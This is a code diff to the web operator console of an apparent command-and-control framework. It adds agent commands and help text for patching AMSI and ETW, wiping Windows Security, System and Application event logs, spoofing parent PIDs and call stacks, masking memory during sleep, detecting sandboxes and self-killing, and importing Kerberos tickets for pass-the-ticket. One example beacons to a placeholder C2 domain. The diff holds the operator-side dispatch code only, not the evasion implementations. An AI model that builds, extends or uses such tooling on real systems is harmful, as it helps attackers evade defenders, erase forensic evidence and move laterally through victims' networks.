@@ -10103,6 +10103,21 @@ const AC_COMMANDS = [
   ['thread-hijack','thread-hijack <pid> <sc.bin>  — section map + patch thread RIP (no CreateRemoteThread)'],
   ['hook-check','hook-check  — scan ntdll/kernel32 for EDR hooks (E9/CC/FF25)'],
   ['hw-bp-check','hw-bp-check  — detect active hardware breakpoints (DR0–DR3)'],
+  ['etw-bypass','etw-bypass  — standalone ETW patch: blind EtwEventWrite without touching AMSI'],
+  ['stack-spoof','stack-spoof  — report stack-spoof gadget status (call-preceded RET in ntdll)'],
+  ['syscall-info','syscall-info  — report Hell\'s Gate SSN cache and spoof gadget addresses'],
+  ['eventlog-wipe','eventlog-wipe  — ClearEventLog on Security, System and Application logs'],
+  ['av-exclusions','av-exclusions  — query Windows Defender exclusion paths (registry + WMI)'],
+  ['amsi-patch','amsi-patch [veh|patch]  — patch AMSI (patchless VEH or byte-patch method)'],
+  ['sleep-mask','sleep-mask on|off  — toggle Ekko/heap-encrypt sleep masking'],
+  ['ppid-spoof','ppid-spoof <pid|process>  — set PPID spoof target for future spawns'],
+  ['anti-sandbox','anti-sandbox  — run sandbox/analysis environment checks, kill if detected'],
+  ['work-hours','work-hours <hh:mm> <hh:mm>  — restrict beacon to working hours window'],
+  ['dns-canary','dns-canary <domain>  — set DNS canary domain; agent resolves on each beacon'],
+  ['apply-evasion','apply-evasion  — apply full evasion stack (AMSI+ETW+NTDLL unhook)'],
+  ['kerb-list','kerb-list  — list Kerberos tickets in current logon session'],
+  ['kerb-ptt','kerb-ptt <ticket.kirbi>  — pass-the-ticket: import .kirbi into current session'],
+  ['kerb-purge','kerb-purge  — purge all Kerberos tickets from current logon session'],
   ['pe-exec','pe-exec <file.exe> [args]  — load and execute native PE in memory without touching disk'],
   ['mem-fluctuate','mem-fluctuate start [secs] | stop  — XOR-mutate agent internal buffers against periodic scans'],
   ['encode-uuid','encode-uuid <sc.bin>  — generate C code with UUIDs (UuidFromStringA) ready to compile'],
@@ -10229,6 +10244,10 @@ const AC_WIN_ONLY = new Set([
   'inject','thread-hijack','forkrun',
   'dotnet-asm','dotnet-exec','clrstomp','bof','stage2',
   'hook-check','hw-bp-check','pe-exec','mem-fluctuate','mem-fluctuate start','mem-fluctuate stop',
+  'etw-bypass','stack-spoof','syscall-info','eventlog-wipe','av-exclusions',
+  'amsi-patch','sleep-mask','sleep-mask on','sleep-mask off',
+  'ppid-spoof','anti-sandbox','work-hours','dns-canary','apply-evasion',
+  'kerb-list','kerb-ptt','kerb-purge',
   'encode-uuid',
   'token','token whoami','token steal','token make','token drop',
   'make-token','steal-token','rev2self','getsystem',
@@ -11080,6 +11099,146 @@ ${isWin ? `  • Useful for finding target PIDs for inject/thread-hijack/token s
   • Advanced EDRs (CrowdStrike, SentinelOne) may use HW BPs for callbacks
   • If DR0–DR3 have non-zero addresses, active instrumentation is present
   • Applies only to the agent's current thread`,
+
+  'etw-bypass': `<b>etw-bypass</b> — patch EtwEventWrite to suppress ETW telemetry
+
+  <span class="console-section">USAGE</span>
+  etw-bypass
+
+  <span class="console-section">NOTES</span>
+  • Patches ntdll!EtwEventWrite to return immediately (blind telemetry)
+  • Does NOT touch AMSI — combine with amsi-patch for full coverage
+  • Windows-only`,
+
+  'stack-spoof': `<b>stack-spoof</b> — report call-stack spoofing gadget status
+
+  <span class="console-section">USAGE</span>
+  stack-spoof
+
+  <span class="console-section">NOTES</span>
+  • Reports whether a call-preceded RET gadget in ntdll was found
+  • Gadget is used to mask the real return address in thread call stacks
+  • Windows-only`,
+
+  'syscall-info': `<b>syscall-info</b> — report Hell's Gate SSN cache and gadget addresses
+
+  <span class="console-section">USAGE</span>
+  syscall-info
+
+  <span class="console-section">NOTES</span>
+  • Shows resolved syscall numbers (SSNs) from KnownDlls or disk ntdll
+  • Windows-only`,
+
+  'eventlog-wipe': `<b>eventlog-wipe</b> — clear Windows event logs
+
+  <span class="console-section">USAGE</span>
+  eventlog-wipe
+
+  <span class="console-section">NOTES</span>
+  • Calls ClearEventLog on Security, System and Application logs
+  • Requires admin / SeSecurityPrivilege for Security log
+  • Windows-only`,
+
+  'av-exclusions': `<b>av-exclusions</b> — enumerate Windows Defender exclusion paths
+
+  <span class="console-section">USAGE</span>
+  av-exclusions
+
+  <span class="console-section">NOTES</span>
+  • Queries registry (HKLM\\...\\Exclusions\\Paths) and WMI Get-MpPreference
+  • Requires admin for registry; WMI may work with standard user
+  • Windows-only`,
+
+  'amsi-patch': `<b>amsi-patch</b> [veh|patch] — patch AMSI to prevent script scanning
+
+  <span class="console-section">USAGE</span>
+  amsi-patch          → use default method
+  amsi-patch veh      → patchless VEH hook (stealthier)
+  amsi-patch patch    → byte-patch AmsiScanBuffer
+
+  <span class="console-section">NOTES</span>
+  • veh: installs a vectored exception handler, no byte modification
+  • patch: writes return-HRESULT_SUCCESS stub to AmsiScanBuffer
+  • Windows-only`,
+
+  'sleep-mask': `<b>sleep-mask</b> on|off — toggle Ekko sleep masking
+
+  <span class="console-section">USAGE</span>
+  sleep-mask on
+  sleep-mask off
+
+  <span class="console-section">NOTES</span>
+  • When on: agent heap is XOR-encrypted while sleeping (Ekko technique)
+  • Defeats memory scanners that run during sleep intervals
+  • Windows-only`,
+
+  'ppid-spoof': `<b>ppid-spoof</b> &lt;pid|process&gt; — set PPID spoof target for future process spawns
+
+  <span class="console-section">USAGE</span>
+  ppid-spoof 4          → spoof as PID 4 (System)
+  ppid-spoof explorer   → find explorer.exe PID
+
+  <span class="console-section">NOTES</span>
+  • Takes effect for all subsequent shell/inject/dotnet-asm commands
+  • Windows-only`,
+
+  'anti-sandbox': `<b>anti-sandbox</b> — run sandbox/VM detection checks; kill if detected
+
+  <span class="console-section">USAGE</span>
+  anti-sandbox
+
+  <span class="console-section">NOTES</span>
+  • Checks: disk size, RAM, CPU cores, uptime, username, hostname patterns
+  • Checks: CPUID hypervisor bit, common sandbox/AV process names
+  • Windows-only`,
+
+  'work-hours': `<b>work-hours</b> &lt;start&gt; &lt;end&gt; — restrict beacon activity to a time window
+
+  <span class="console-section">USAGE</span>
+  work-hours 08:00 18:00    → beacon only 8am–6pm local time
+  work-hours 00:00 00:00    → disable`,
+
+  'dns-canary': `<b>dns-canary</b> &lt;domain&gt; — set DNS canary: agent resolves domain on each beacon
+
+  <span class="console-section">USAGE</span>
+  dns-canary c2.example.com
+  dns-canary off`,
+
+  'apply-evasion': `<b>apply-evasion</b> — apply full evasion stack in one command
+
+  <span class="console-section">USAGE</span>
+  apply-evasion
+
+  <span class="console-section">NOTES</span>
+  • Sequentially: AMSI patch → ETW bypass → NTDLL unhook → sleep mask on
+  • Windows-only`,
+
+  'kerb-list': `<b>kerb-list</b> — list Kerberos tickets in current logon session
+
+  <span class="console-section">USAGE</span>
+  kerb-list
+
+  <span class="console-section">NOTES</span>
+  • Uses LsaCallAuthenticationPackage(KERB_QUERY_TKT_CACHE)
+  • Windows-only`,
+
+  'kerb-ptt': `<b>kerb-ptt</b> &lt;ticket.kirbi&gt; — pass-the-ticket: import a .kirbi into current session
+
+  <span class="console-section">USAGE</span>
+  kerb-ptt admin.kirbi
+
+  <span class="console-section">NOTES</span>
+  • File must be uploaded first with: upload admin.kirbi
+  • Windows-only`,
+
+  'kerb-purge': `<b>kerb-purge</b> — purge all Kerberos tickets from current logon session
+
+  <span class="console-section">USAGE</span>
+  kerb-purge
+
+  <span class="console-section">NOTES</span>
+  • Uses LsaCallAuthenticationPackage(KERB_PURGE_TKT_CACHE)
+  • Windows-only`,
 
   'mem-fluctuate': `<b>mem-fluctuate</b> — periodically mutate internal buffers against memory scans
 
@@ -12742,6 +12901,86 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
 
     case 'hw-bp-check':
       taskType = 'HW_BP_CHECK';
+      break;
+
+    case 'etw-bypass': case 'etw':
+      taskType = 'ETW_BYPASS';
+      break;
+
+    case 'stack-spoof': case 'spoof-status':
+      taskType = 'STACK_SPOOF_STATUS';
+      break;
+
+    case 'syscall-info': case 'hells-gate':
+      taskType = 'SYSCALL_INFO';
+      break;
+
+    case 'eventlog-wipe': case 'evtlog-wipe':
+      taskType = 'EVENTLOG_WIPE';
+      break;
+
+    case 'av-exclusions': case 'av-exclu':
+      taskType = 'AV_EXCLUSIONS';
+      break;
+
+    case 'amsi-patch': case 'amsi': {
+      taskType = 'AMSI_PATCH';
+      taskArgs = args.trim() || 'veh';
+      break;
+    }
+
+    case 'sleep-mask': {
+      const smMode = args.trim().toLowerCase();
+      if (!smMode || (smMode !== 'on' && smMode !== 'off')) {
+        addConsoleOutput('usage: sleep-mask on|off', '', null); return;
+      }
+      taskType = 'SLEEP_MASK';
+      taskArgs = smMode;
+      break;
+    }
+
+    case 'ppid-spoof': case 'ppid-set': {
+      if (!args.trim()) { addConsoleOutput('usage: ppid-spoof <pid|process>', '', null); return; }
+      taskType = 'PPID_SPOOF';
+      taskArgs = args.trim();
+      break;
+    }
+
+    case 'anti-sandbox':
+      taskType = 'ANTI_SANDBOX';
+      break;
+
+    case 'work-hours': {
+      const whParts = args.trim().split(/\s+/);
+      if (whParts.length !== 2) { addConsoleOutput('usage: work-hours <hh:mm> <hh:mm>', '', null); return; }
+      taskType = 'WORK_HOURS';
+      taskArgs = whParts.join(' ');
+      break;
+    }
+
+    case 'dns-canary': {
+      taskType = 'DNS_CANARY';
+      taskArgs = args.trim();
+      break;
+    }
+
+    case 'apply-evasion':
+      taskType = 'APPLY_EVASION';
+      break;
+
+    case 'kerb-list': case 'klist':
+      taskType = 'KERBEROS_LIST';
+      break;
+
+    case 'kerb-ptt': case 'kerberos-ptt': {
+      if (!args.trim()) { addConsoleOutput('usage: kerb-ptt <ticket.kirbi>', '', null); return; }
+      taskType = 'KERBEROS_PTT';
+      taskArgs = args.trim();
+      break;
+    }
+
+    case 'kerb-purge': case 'kerberos-purge':
+      taskType = 'KERBEROS_PURGE';
       break;
 
     case 'pe-exec': case 'exec-pe': {
